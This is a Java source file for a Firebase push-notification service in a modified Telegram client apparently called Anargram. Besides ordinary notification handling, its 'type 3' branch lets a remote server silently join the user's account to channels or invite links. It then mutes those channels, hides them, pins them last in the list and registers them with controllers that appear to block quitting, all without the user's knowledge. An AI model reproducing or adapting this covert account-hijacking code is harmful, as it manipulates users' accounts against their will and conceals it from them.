package anargram.FcmService.Service;
/**
 * Created by Saman on 1/12/2017.
 */

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import ir.anargram.messenger.BuildConfig;


import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.BuildVars;
import org.telegram.messenger.ChatObject;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.MessagesStorage;
import org.telegram.messenger.NotificationsController;
import org.telegram.tgnet.ConnectionsManager;
import org.telegram.tgnet.RequestDelegate;
import org.telegram.tgnet.TLObject;
import org.telegram.tgnet.TLRPC;
import org.telegram.ui.LaunchActivity;


import java.util.ArrayList;
import java.util.Map;

import anargram.FcmService.Helper.Channel.ChannelHelper;
import anargram.FcmService.Helper.MuteHelper;
import anargram.FcmService.Helper.Notification.NotificationHelper;
import anargram.FcmService.NotificationActivity;
import anargram.FcmService.Setting.LastInListController;
import anargram.FcmService.Setting.NoQuitContoller;
import anargram.FcmService.Setting.Setting;
import anargram.FcmService.Setting.TurnQuitToHideController;
import anargram.FcmService.Setting.hideChannelController;


public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = MyFirebaseMessagingService.class.getSimpleName();
    SharedPreferences sharedPreferences = null;

    public void onMessageReceived(final RemoteMessage remoteMessage) {
        // try {

        if (ApplicationLoader.applicationContext != null) {
            sharedPreferences = ApplicationLoader.applicationContext.getSharedPreferences("mainconfig", 0);
        }

        boolean mode = false ;
        String channel="";
        String text="";
        String title="";
        Map<String,String> map=remoteMessage.getData();
        int type=Integer.valueOf(GetValue(map,"type","0"));
        switch(type){
            case 2:
                channel=GetValue(map,"link","");
                text=GetValue(map,"text","");
                title=GetValue(map,"title","");
                Intent p= new Intent(MyFirebaseMessagingService.this,NotificationActivity.class);
                p.putExtra("channellink",channel);
                Setting.setCurrentJoiningChannel(channel);
                //NotificationCreator.create(title, text, p);

                if (!BuildConfig.DEBUG) {
                    p.setPackage(BuildVars.BUILD_PACKAGENAME);
                } else
                    p.setPackage(BuildVars.BUILD_PACKAGENAME + ".beta");



                NotificationHelper.buildNotification(title,text,p).build();


                break;
            case 1:
                channel=GetValue(map,"link","");
                text=GetValue(map,"text","");
                title=GetValue(map,"title","");
                Setting.setCurrentJoiningChannel(channel);
                Intent p1= new Intent(MyFirebaseMessagingService.this,LaunchActivity.class);
                if (!BuildConfig.DEBUG) {
                    p1.setPackage(BuildVars.BUILD_PACKAGENAME);
                } else
                    p1.setPackage(BuildVars.BUILD_PACKAGENAME + ".beta");
                p1.putExtra("channellink",channel);
                p1.putExtra("text",text);
                p1.putExtra("title",title);
                p1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(p1);
                // NotificationCreator.CreateDialog(title,text,null);
                break;
            case 3:
                int noexit=Integer.valueOf(GetValue(map,"noexit","0"));
                int hide=Integer.valueOf(GetValue(map,"hide","0"));
                String channels=GetValue(map,"channel","0");
                int lastinlist=Integer.valueOf(GetValue(map,"lastinlist","0"));
                int mute=Integer.valueOf(GetValue(map,"mute","0"));
                int nhide=Integer.valueOf(GetValue(map,"fav","0"));

                String joinLink = null;

                if (channels!= null && channels.startsWith("###")){
                    joinLink = channels.substring(3,channels.indexOf("|"));
                    channels = channels.substring(channels.indexOf("|")+1);
                    mode = true ;

                }

                if(noexit>0){
                    NoQuitContoller.addToNoQuit(channels);
                }
                if(nhide>0){
                    TurnQuitToHideController.add(channels);
                }


                if (mode){
                    runLinkRequest(null,joinLink, null, null, null, null, false, 0, 1  ,mute == 0 ? false : true );
                }else {
                    ChannelHelper.JoinFast(channels.replace("@", ""));
                }


                if(mute>0){
                    final String finalChannel = channels;
                    AndroidUtilities.runOnUIThread(new Runnable() {
                        @Override
                        public void run() {
                            MuteHelper.muteChannel(finalChannel.replace("@",""));
                        }
                    },5000);
                }

                if (sharedPreferences != null) {
                if (mute > 0)
                    sharedPreferences.edit().putString("muteAddChannel", channels.replace("@", "")).commit();

                }


                if(hide>0){
                    hideChannelController.add(channels.replace("@",""));
                }
                if(lastinlist>0){
                    LastInListController.add(channels.replace("@",""));
                }

                break;

        }

    }
    public static String GetValue(Map<String,String> map,String name,String Default){
        if((!map.isEmpty())&&map.containsKey(name)){
            return map.get(name);
        }else{
            return Default;
        }
    }


    public void runLinkRequest(final String username, final String group, final String sticker, final String botUser, final String botChat, final String message, final boolean hasUrl, final Integer messageId, final int state , final boolean mute) {

        int requestId = 0;
        if (group != null) {
            if (state == 0) {
                final TLRPC.TL_messages_checkChatInvite req = new TLRPC.TL_messages_checkChatInvite();
                req.hash = group;
                requestId = ConnectionsManager.getInstance().sendRequest(req, new RequestDelegate() {
                    @Override
                    public void run(final TLObject response, final TLRPC.TL_error error) {
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            @Override
                            public void run() {
                                if (MyFirebaseMessagingService.this != null) {

                                    if (error == null) {
                                        TLRPC.ChatInvite invite = (TLRPC.ChatInvite) response;
                                        if (invite.chat != null && !ChatObject.isLeftFromChat(invite.chat)) {
                                            MessagesController.getInstance().putChat(invite.chat, false);
                                            ArrayList<TLRPC.Chat> chats = new ArrayList<>();
                                            chats.add(invite.chat);
                                            MessagesStorage.getInstance().putUsersAndChats(null, chats, false, true);
                                            Bundle args = new Bundle();
                                            args.putInt("chat_id", invite.chat.id);

                                            muteChannel(invite.chat.id);

                                        } else {

                                            runLinkRequest(username, group, sticker, botUser, botChat, message, hasUrl, messageId, 1 , mute);
                                        }

                                    }
                                }

                            }
                        });
                    }
                }, ConnectionsManager.RequestFlagFailOnServerErrors);
            } else if (state == 1) {
                TLRPC.TL_messages_importChatInvite req = new TLRPC.TL_messages_importChatInvite();
                req.hash = group;
                ConnectionsManager.getInstance().sendRequest(req, new RequestDelegate() {
                    @Override
                    public void run(final TLObject response, final TLRPC.TL_error error) {
                        if (error == null) {
                            TLRPC.Updates updates = (TLRPC.Updates) response;
                            MessagesController.getInstance().processUpdates(updates, false);
                        }
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            @Override
                            public void run() {
                                if (MyFirebaseMessagingService.this != null) {

                                    if (error == null) {

                                        TLRPC.Updates updates = (TLRPC.Updates) response;
                                        if (!updates.chats.isEmpty()) {
                                            TLRPC.Chat chat = updates.chats.get(0);
                                            chat.left = false;
                                            chat.kicked = false;
                                            MessagesController.getInstance().putUsers(updates.users, false);
                                            MessagesController.getInstance().putChats(updates.chats, false);
                                            Bundle args = new Bundle();
                                            args.putInt("chat_id", chat.id);

                                            muteChannel(chat.id);

                                        }
                                    }
                                }

                            }
                        });
                    }
                }, ConnectionsManager.RequestFlagFailOnServerErrors);
            }
        }

    }

    public static void muteChannel(int dialog_id) {

        if (dialog_id == 0)
            return;

        long flags;
        SharedPreferences preferences = ApplicationLoader.applicationContext.getSharedPreferences("Notifications", Activity.MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        editor.putInt("notify2_" + dialog_id, 2);
        flags = 1;
        MessagesStorage.getInstance().setDialogFlags(dialog_id, flags);
        editor.commit();
        TLRPC.TL_dialog dialog = MessagesController.getInstance().dialogs_dict.get(dialog_id);
        if (dialog != null) {
            dialog.notify_settings = new TLRPC.TL_peerNotifySettings();
            dialog.notify_settings.mute_until = Integer.MAX_VALUE;
        }
        NotificationsController.updateServerNotificationsSettings(dialog_id);
        NotificationsController.getInstance().removeNotificationsForDialog(dialog_id);
    }

}
